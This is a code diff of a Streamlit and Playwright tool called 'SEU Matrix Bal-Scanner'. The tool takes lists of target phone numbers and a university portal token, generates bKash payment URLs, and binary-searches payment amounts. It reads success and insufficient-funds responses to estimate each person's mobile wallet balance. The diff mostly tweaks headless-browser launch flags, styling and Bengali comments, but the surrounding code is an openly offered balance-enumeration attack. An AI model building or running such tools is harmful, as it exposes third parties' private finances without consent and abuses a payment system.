@@ -13,12 +13,13 @@ st.set_page_config(page_title="SEU Matrix Bal-Scanner", page_icon="🧬", layout
 # ==================== PLAYWRIGHT INSTALLATION RUNNER ====================
 @st.cache_resource
 def install_playwright_dependencies():
-    with st.spinner("Installing Cyber Architecture Components (Playwright)..."):
+    with st.spinner("Initializing Linux Headless Shell Drivers..."):
         try:
             import playwright
         except ModuleNotFoundError:
             os.system(f"{sys.executable} -m pip install playwright")
-        os.system(f"{sys.executable} -m playwright install-deps")
+        
+        # ক্লাউড বা লোকাল এনভায়রনমেন্টে ব্রাউজার বাইনারি নিশ্চিত করা
         os.system(f"{sys.executable} -m playwright install chromium")
     return True
 
@@ -71,7 +72,7 @@ st.markdown("""
         padding: 15px;
         font-family: 'Courier New', monospace;
         color: #39ff14 !important;
-        height: 320px;
+        height: 350px;
         overflow-y: auto;
         box-shadow: 0 0 15px rgba(0, 240, 255, 0.1) inset, 0 0 10px rgba(0, 240, 255, 0.1);
         white-space: pre-wrap;
@@ -167,7 +168,7 @@ async def execute_gateway_check(page, number, bkash_url):
 
 # ==================== STREAMLIT INTERFACE UI ====================
 st.title("🧬 SEU MATRIX TARGET BAL-SCANNER")
-st.markdown("<p style='color: #ff007f; font-weight:bold; margin-top:-15px;'>[ BACKEND PIPELINE: ENGINE READY ]</p>", unsafe_allow_html=True)
+st.markdown("<p style='color: #00f0ff; font-weight:bold; margin-top:-15px;'>[ BACKEND PIPELINE: ENGINE READY ]</p>", unsafe_allow_html=True)
 st.markdown("---")
 
 col_left, col_right = st.columns([7, 5])
@@ -190,26 +191,21 @@ with col_right:
 with col_left:
     st.subheader("🖥️ Cyber Live Matrix Terminal")
     
-    # টার্মিনাল উইন্ডো সিমুলেশন
     log_placeholder = st.empty()
     
-    # লগ ডাটা রিফ্রেশ ও ফরম্যাটিং রেন্ডারার
     def update_terminal(new_line):
         st.session_state.terminal_logs.append(new_line)
-        # টার্মিনালে সর্বোচ্চ ১০০ লাইন হোল্ড করবে বাফারিং সেভ রাখতে
         if len(st.session_state.terminal_logs) > 100:
             st.session_state.terminal_logs.pop(0)
         full_logs = "\n".join(st.session_state.terminal_logs)
         log_placeholder.markdown(f'<div class="terminal-box">{full_logs}</div>', unsafe_allow_html=True)
 
-    # শুরুর ব্লাঙ্ক স্টেট রেন্ডার
     if not st.session_state.terminal_logs:
         log_placeholder.markdown('<div class="terminal-box">[SYSTEM]: Awaiting target execution array signals...</div>', unsafe_allow_html=True)
     else:
         full_logs = "\n".join(st.session_state.terminal_logs)
         log_placeholder.markdown(f'<div class="terminal-box">{full_logs}</div>', unsafe_allow_html=True)
 
-    # কন্ট্রোল প্যানেল বাটন গ্রিড
     btn_col1, btn_col2 = st.columns([1, 1])
     with btn_col1:
         start_trigger = st.button("⚡ Trigger Scanning Sequence", use_container_width=True)
@@ -223,9 +219,15 @@ with col_left:
 async def pipeline_scanner_core(target_numbers, auth_token):
     async with async_playwright() as p:
         try:
+            # ক্লাউড সার্ভার ফ্রেন্ডলি আর্গুমেন্টস প্যারামিটার এনকোডিং
             browser = await p.chromium.launch(
                 headless=True,
-                args=['--no-sandbox', '--disable-setuid-sandbox']
+                args=[
+                    '--no-sandbox', 
+                    '--disable-setuid-sandbox',
+                    '--disable-dev-shm-usage',
+                    '--disable-gpu'
+                ]
             )
             context = await browser.new_context(
                 viewport={"width": 1280, "height": 800},
@@ -245,7 +247,6 @@ async def pipeline_scanner_core(target_numbers, auth_token):
             is_valid_user = False
             req_count = 0
 
-            # ১. প্রিলিমিনারি ক্রাইটেরিয়া চেকিং
             init_url = get_seu_bkash_url(number, MIN_AMOUNT, auth_token)
             if not init_url:
                 update_terminal(f"  ├─ [AUTH MISM_ERR]: Token Invalid or UMS Service Outage.")
@@ -265,7 +266,6 @@ async def pipeline_scanner_core(target_numbers, auth_token):
                 update_terminal(f"  └─ [{init_status}]: Intercept Error on Node.")
                 continue
 
-            # ২. পিওর থাউজ্যান্ডস বাইনারি সার্চ ম্যাট্রিক্স
             if is_valid_user:
                 while low_idx <= high_idx:
                     mid_idx = (low_idx + high_idx) // 2
@@ -288,9 +288,9 @@ async def pipeline_scanner_core(target_numbers, auth_token):
 
                     if status == "SUCCESS":
                         estimated_balance = mid_amount
-                        low_idx = mid_idx + 1  # আপার হাফ-এ শিফট হবে
+                        low_idx = mid_idx + 1  
                     elif status == "INSUFFICIENT":
-                        high_idx = mid_idx - 1  # লোয়ার হাফ-এ শিফট হবে
+                        high_idx = mid_idx - 1  
                     else:
                         await asyncio.sleep(1)
                         continue
@@ -305,7 +305,6 @@ async def pipeline_scanner_core(target_numbers, auth_token):
         await browser.close()
         update_terminal("\n[SYSTEM LOG]: Target Scan Deployment Terminal Sequence Over.")
 
-# ট্র্রিগার প্রসেসিং হ্যান্ডলার 
 if start_trigger:
     parsed_list = clean_and_parse_numbers(raw_nodes)
     loaded_token = load_config().get("token", "")
